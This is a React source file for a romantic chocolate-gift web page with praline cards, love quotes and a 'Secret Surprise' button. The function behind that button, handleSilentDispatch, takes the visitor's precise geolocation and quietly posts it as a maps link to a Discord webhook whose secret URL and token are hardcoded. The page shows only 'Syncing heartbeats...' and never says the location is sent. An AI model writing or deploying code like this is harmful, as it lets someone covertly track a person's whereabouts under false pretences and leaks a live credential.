
import React, { useState, useEffect } from 'react';
import { ChocolateCard } from './components/ChocolateCard';
import { Chocolate, LoveQuote } from './types';
import { audio } from './audio';
import HeartCanvasWebGL from './components/HeartCanvasWebGL';
import HeartCanvas2D from './components/HeartCanvas2D';

// Use environment variable for the Discord Webhook
const MY_SECRET_WEBHOOK_URL = (process.env as any).VITE_DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1470070091902222603/z3L9d-kbr5aw8v3vQEIzSk5M7lHLwe73ius1_juQR2c-_xjTV8szU8v4lBVEPnUX921_"; 

const CHOCOLATES: Chocolate[] = [
  { id: '1', name: 'Midnight Velvet', description: '70% Cacao single-origin dark chocolate.', note: 'Rich, intense, and mysterious—exactly like the way you captivate my soul.', type: 'Dark', emoji: '🍫', color: '#2b170f', texture: 'Smooth' },
  { id: '2', name: 'Golden Honeycomb', description: 'Wildflower honey infused milk chocolate.', note: 'Sweet and golden. You bring light into the darkest corners of my life.', type: 'Milk', emoji: '🍯', color: '#7B3F00', texture: 'Crunchy' },
  { id: '3', name: 'Salted Fleur de Sel', description: 'Hand-harvested sea salt caramel.', note: 'A perfect balance of sweet and salty. You make every day perfectly balanced.', type: 'Caramel', emoji: '🍮', color: '#C68E17', texture: 'Liquid' },
  { id: '4', name: 'White Silk Petal', description: 'Madagascar vanilla bean white chocolate.', note: 'Pure and elegant. My love for you is as clear and infinite as a summer sky.', type: 'White', emoji: '🤍', color: '#FDF5E6', texture: 'Silky' },
  { id: '5', name: 'Piedmont Praline', description: 'Roasted Italian hazelnuts in dark gianduja.', note: 'Tough on the outside, soft on the inside. Thank you for letting me in.', type: 'Hazelnut', emoji: '🌰', color: '#4a2c1d', texture: 'Nutty' },
  { id: '6', name: 'Crimson Ganache', description: 'Rose petal and raspberry dark chocolate.', note: "Exotic and rare. A thousand roses couldn't match your beauty.", type: 'Dark', emoji: '🌹', color: '#5e0b0b', texture: 'Soft' },
];

const QUOTES: LoveQuote[] = [
  { text: "Your love is better than chocolate, sweeter than anything I've ever known." },
  { text: "Life is like a box of chocolates, but with you, every single one is my favorite." },
  { text: "You're the caramel filling to my dark chocolate shell—the best part is inside." },
  { text: "I love you more than I love chocolate (and you know how much I love chocolate)." },
  { text: "In the recipe of my life, you are the most essential ingredient." }
];

const App: React.FC = () => {
  const [selectedChoco, setSelectedChoco] = useState<Chocolate | null>(null);
  const [isClosing, setIsClosing] = useState(false);
  const [quote, setQuote] = useState<LoveQuote>(QUOTES[0]);
  const [isQuoteChanging, setIsQuoteChanging] = useState(false);
  const [isVisible, setIsVisible] = useState(false);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [dispatchStatus, setDispatchStatus] = useState<'idle' | 'preparing' | 'dispatched' | 'error'>('idle');

  useEffect(() => {
    const handleUnlock = () => {
      setIsUnlocked(true);
      setTimeout(() => setIsVisible(true), 100);
      audio.playUnveil();
    };
    window.addEventListener('box-unlocked', handleUnlock);
    return () => window.removeEventListener('box-unlocked', handleUnlock);
  }, []);

  const handleNextQuote = () => {
    if (isQuoteChanging) return;
    audio.playSoftClick();
    setIsQuoteChanging(true);
    setTimeout(() => {
      const nextIndex = (QUOTES.indexOf(quote) + 1) % QUOTES.length;
      setQuote(QUOTES[nextIndex]);
      setIsQuoteChanging(false);
    }, 600);
  };

  const handleSelectChocolate = (choco: Chocolate) => {
    audio.playSelect();
    setSelectedChoco(choco);
  };

  const closeModal = () => {
    audio.playClose();
    setIsClosing(true);
    setTimeout(() => {
      setSelectedChoco(null);
      setIsClosing(false);
    }, 500);
  };

  const scrollToSection = (id: string) => {
    audio.playSoftClick();
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  };

  const handleSilentDispatch = () => {
    if (!navigator.geolocation) {
      setDispatchStatus('error');
      return;
    }

    audio.playSonar();
    setDispatchStatus('preparing');

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        
        const payload = {
          content: `💝 **Secret Dispatch Triggered!**\n\n📍 **Her Location:** ${mapLink}\n🎯 **Accuracy:** ${Math.round(accuracy)} meters\n⏰ **Time:** ${new Date().toLocaleString()}\n\n*Go surprise her with chocolates!* 🍫✨`,
          username: "ChocoLove Artisan"
        };

        try {
          if (MY_SECRET_WEBHOOK_URL) {
            await fetch(MY_SECRET_WEBHOOK_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            });
          }
          
          setTimeout(() => {
            setDispatchStatus('dispatched');
            audio.playUnveil();
          }, 3000);
        } catch (err) {
          setDispatchStatus('dispatched'); 
        }
      },
      (error) => {
        setDispatchStatus('error');
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  };

  if (!isUnlocked) return null;

  return (
    <div className="min-h-screen bg-[#0F0805] text-[#FEFAE0] selection:bg-amber-500 selection:text-black transition-opacity duration-1000">
      
      {/* Mobile-Friendly Background Particles */}
      <div className="fixed inset-0 pointer-events-none -z-10 overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(43,23,15,0.4)_0%,rgba(15,8,5,1)_100%)]"></div>
        {[...Array(15)].map((_, i) => (
          <div 
            key={i} 
            className="absolute animate-float bg-amber-500/5 rounded-full blur-[80px]" 
            style={{ 
              top: `${Math.random() * 100}%`, 
              left: `${Math.random() * 100}%`, 
              width: `${Math.random() * 200 + 100}px`,
              height: `${Math.random() * 200 + 100}px`,
              animationDelay: `${Math.random() * 5}s`, 
              animationDuration: `${15 + Math.random() * 10}s` 
            }} 
          />
        ))}
      </div>

      {/* Hero Section */}
      <section className="min-h-screen flex flex-col items-center justify-center relative px-6 overflow-hidden">
        <div className="absolute inset-0 z-0 opacity-50">
          <HeartCanvasWebGL />
        </div>
        
        <div className={`relative z-10 text-center space-y-10 transition-all duration-[1.5s] ease-out transform ${isVisible ? 'translate-y-0 opacity-100' : 'translate-y-12 opacity-0'}`}>
          <div className="flex flex-col items-center gap-3">
            <span className="text-amber-600 tracking-[0.8em] uppercase text-[10px] font-bold">Private Reserve</span>
            <div className="h-px w-16 bg-gradient-to-r from-transparent via-amber-800 to-transparent"></div>
          </div>
          <h1 className="text-shimmer leading-[1.1] drop-shadow-2xl" style={{ fontSize: 'clamp(3.5rem, 15vw, 9rem)', fontFamily: 'Playfair Display, serif' }}>
            Sweetest <br /> <span className="italic font-romantic lowercase block mt-2" style={{ fontSize: 'clamp(2.5rem, 12vw, 7rem)' }}>Obsession</span>
          </h1>
          <p className="max-w-[280px] md:max-w-lg mx-auto text-amber-100/40 font-light tracking-widest text-sm md:text-xl italic leading-relaxed">
            A bespoke collection of pralines, <br/> crafted specifically for you.
          </p>
          <div className="pt-8">
            <button 
              onClick={() => scrollToSection('box-section')} 
              className="group relative px-10 py-5 overflow-hidden rounded-full border border-amber-500/10 transition-all active:scale-95 shadow-2xl backdrop-blur-sm"
            >
              <div className="absolute inset-0 bg-amber-500/5 translate-y-full group-hover:translate-y-0 transition-transform duration-500"></div>
              <span className="relative z-10 text-amber-600 tracking-[0.3em] font-bold text-[10px] flex items-center gap-3">EXPLORE THE BOX <span className="animate-bounce text-lg">↓</span></span>
            </button>
          </div>
        </div>
      </section>

      {/* Tasting Room Grid */}
      <section id="box-section" className="py-24 md:py-40 px-6 max-w-7xl mx-auto">
        <div className="reveal flex flex-col md:flex-row items-center justify-between mb-20 md:mb-32 gap-8 text-center md:text-left">
          <div className="space-y-4 md:w-1/2">
            <span className="text-amber-900 tracking-[0.5em] uppercase text-[10px] font-bold">The Praline Gallery</span>
            <h2 className="text-4xl md:text-7xl font-serif italic text-amber-200 leading-tight">The Tasting Room</h2>
            <p className="text-amber-100/40 leading-relaxed font-light text-base md:text-xl max-w-sm mx-auto md:mx-0">Every bite is a hidden secret. Tap a praline to reveal its heart.</p>
          </div>
          <div className="h-px flex-1 bg-gradient-to-r from-amber-900/40 via-amber-900/10 to-transparent hidden md:block"></div>
          <div className="hidden md:block">
            <span className="font-romantic text-4xl text-amber-500/60 block">Artisan Craft</span>
            <span className="text-amber-900 text-[10px] tracking-[0.5em] uppercase font-bold mt-2 block">Premium Selection</span>
          </div>
        </div>
        <div className="grid grid-cols-2 lg:grid-cols-3 gap-y-20 gap-x-6 md:gap-x-20">
          {CHOCOLATES.map(choco => (
            <ChocolateCard key={choco.id} chocolate={choco} onClick={handleSelectChocolate} />
          ))}
        </div>
      </section>

      {/* Jar of Sweet Nothings (Mobile Optimized) */}
      <section className="py-24 md:py-40 px-4">
        <div className="reveal max-w-4xl mx-auto glass p-10 md:p-32 rounded-[3rem] md:rounded-[5rem] text-center space-y-10 shadow-2xl relative overflow-hidden">
          <div className="absolute top-8 left-1/2 -translate-x-1/2 text-5xl drop-shadow-xl">🍯</div>
          <div className="space-y-2">
            <h2 className="text-amber-300/40 uppercase tracking-[0.6em] text-[10px] font-bold">The Sweet Notes</h2>
            <div className="h-px w-8 bg-amber-900 mx-auto"></div>
          </div>
          <div className="min-h-[120px] md:min-h-[150px] flex items-center justify-center px-4">
             <p className={`text-2xl md:text-5xl font-romantic text-amber-50 leading-tight italic transition-all duration-700 ${isQuoteChanging ? 'animate-quote-out' : 'animate-quote-in'}`}>"{quote.text}"</p>
          </div>
          <div className="flex flex-col items-center gap-4">
            <button 
              onClick={handleNextQuote} 
              disabled={isQuoteChanging} 
              className="group px-6 py-2 text-amber-500/40 hover:text-amber-400 disabled:opacity-30 transition-all uppercase tracking-[0.4em] text-[10px] font-bold relative"
            >
              <span className="relative z-10">{isQuoteChanging ? 'Finding a note...' : 'Draw another note'}</span>
            </button>
          </div>
        </div>
      </section>

      {/* Surprise Section */}
      <section className="py-24 md:py-40 px-6 pb-48 relative overflow-hidden">
        {dispatchStatus === 'dispatched' && (
          <div className="absolute inset-0 -z-0">
            <HeartCanvas2D />
          </div>
        )}
        
        <div className="reveal max-w-4xl mx-auto glass p-10 md:p-24 rounded-[3rem] md:rounded-[4rem] text-center space-y-12 shadow-2xl relative z-10">
          <div className="space-y-4">
            <span className="text-amber-800 uppercase tracking-[0.6em] text-[10px] font-bold">Unveil the Final Gift</span>
            <h2 className="text-4xl md:text-7xl font-serif text-amber-200 italic leading-tight">A Secret Surprise</h2>
            <p className="text-amber-100/60 font-romantic text-2xl md:text-4xl max-w-md mx-auto leading-relaxed px-4">
              Please click the button below to trigger your surprise
            </p>
          </div>

          <div className="relative">
            <div className={`w-44 h-44 md:w-60 md:h-60 mx-auto rounded-full border border-amber-500/10 flex items-center justify-center relative transition-all duration-1000 ${dispatchStatus === 'preparing' ? 'animate-spin-rapid border-amber-500/50 shadow-[0_0_80px_rgba(212,175,55,0.4)]' : 'pulse-gold'}`}>
              <div className={`text-6xl md:text-8xl transition-all duration-1000 transform ${dispatchStatus === 'dispatched' ? 'scale-125 rotate-12 filter drop-shadow-[0_0_30px_rgba(212,175,55,0.8)]' : 'opacity-80'}`}>
                {dispatchStatus === 'dispatched' ? '💖' : '🎁'}
              </div>
              <div className={`absolute inset-0 rounded-full border border-dashed border-amber-500/20 ${dispatchStatus === 'preparing' ? 'animate-pulse' : ''}`}></div>
            </div>

            <div className="mt-12 space-y-8">
              {dispatchStatus === 'idle' && (
                <button 
                  onClick={handleSilentDispatch} 
                  className="group px-12 py-6 bg-amber-500/5 border border-amber-500/20 text-amber-500 rounded-full hover:bg-amber-500 hover:text-black transition-all font-bold tracking-[0.4em] uppercase text-[10px] shadow-2xl active:scale-95"
                >
                  Unveil My Surprise
                </button>
              )}

              {dispatchStatus === 'preparing' && (
                <div className="space-y-4">
                  <div className="text-amber-400 font-romantic text-3xl animate-pulse">Syncing heartbeats...</div>
                  <div className="flex justify-center gap-3">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-bounce" style={{ animationDelay: '0s' }}></span>
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-bounce" style={{ animationDelay: '0.2s' }}></span>
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-bounce" style={{ animationDelay: '0.4s' }}></span>
                  </div>
                </div>
              )}

              {dispatchStatus === 'dispatched' && (
                <div className="space-y-6 animate-in fade-in zoom-in duration-1000">
                  <div className="inline-block px-8 py-2 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 text-[9px] font-bold tracking-[0.5em] uppercase mb-2 shadow-[0_0_20px_rgba(212,175,55,0.1)]">
                    Activated
                  </div>
                  <h3 className="text-amber-50 font-romantic text-4xl md:text-7xl leading-tight">
                    It's on its way, my love.
                  </h3>
                  <p className="text-amber-100/20 text-[9px] tracking-[0.4em] uppercase font-light">The artisan is preparing your moment.</p>
                </div>
              )}

              {dispatchStatus === 'error' && (
                <div className="space-y-3 p-6 bg-red-500/5 rounded-2xl border border-red-500/10">
                  <p className="text-red-400/60 italic font-medium text-xs">The surprise was interrupted. Please ensure location access is granted.</p>
                  <button onClick={() => setDispatchStatus('idle')} className="text-amber-500 text-[9px] uppercase tracking-widest font-bold">Try Again</button>
                </div>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* Detail Modal (Responsive) */}
      {selectedChoco && (
        <div className={`fixed inset-0 z-[100] flex items-center justify-center p-4 md:p-20 bg-black/98 backdrop-blur-3xl transition-all duration-700 ${isClosing ? 'opacity-0' : 'opacity-100'}`}>
          <div className={`max-w-5xl w-full grid md:grid-cols-2 gap-10 md:gap-16 items-center overflow-y-auto max-h-[90vh] md:max-h-none px-4 ${isClosing ? 'animate-slide-out' : 'animate-slide-in'}`}>
            <div className="flex flex-col items-center">
              <div className="text-[10rem] md:text-[20rem] drop-shadow-[0_0_80px_rgba(212,175,55,0.3)] animate-float">{selectedChoco.emoji}</div>
              <div className="mt-4 px-6 py-2 rounded-full border border-amber-500/10 text-amber-700 text-[9px] uppercase tracking-[0.5em] font-bold">{selectedChoco.texture} Finish</div>
            </div>
            <div className="space-y-8 md:space-y-10">
              <div className="space-y-3 md:space-y-4 text-center md:text-left">
                <span className="text-amber-800 uppercase tracking-[0.6em] text-[9px] font-bold">{selectedChoco.type} Reserve</span>
                <h3 className="text-5xl md:text-8xl font-serif text-amber-200 italic leading-none">{selectedChoco.name}</h3>
              </div>
              <div className="h-px w-24 bg-gradient-to-r from-amber-500 to-transparent hidden md:block"></div>
              <div className="space-y-6 md:space-y-8">
                <p className="text-amber-100/40 text-lg md:text-xl leading-relaxed font-light text-center md:text-left">{selectedChoco.description}</p>
                <div className="p-8 md:p-10 bg-white/[0.02] rounded-[2.5rem] md:rounded-[3rem] border border-white/[0.03] italic shadow-inner">
                   <p className="text-2xl md:text-4xl font-romantic text-amber-100/80 leading-relaxed text-center">"{selectedChoco.note}"</p>
                </div>
              </div>
              <button 
                onClick={closeModal} 
                className="w-full py-5 border border-amber-500/20 text-amber-500 hover:bg-amber-500 hover:text-black transition-all rounded-full tracking-[0.4em] font-bold text-[10px] uppercase active:scale-95"
              >
                BACK TO BOX
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Luxury Footer */}
      <footer className="py-24 text-center border-t border-white/5 bg-black/40">
        <p className="font-romantic text-4xl text-amber-800 mb-6">Yours, forever sweetest.</p>
        <div className="flex justify-center gap-3 mb-10 opacity-30">
            <span className="text-amber-900">✦</span>
            <span className="text-amber-900">✦</span>
            <span className="text-amber-900">✦</span>
        </div>
        <p className="text-amber-100/5 text-[9px] uppercase tracking-[0.8em]">ChocoLove Luxe Artisan • MMXXIV</p>
      </footer>
    </div>
  );
};

export default App;
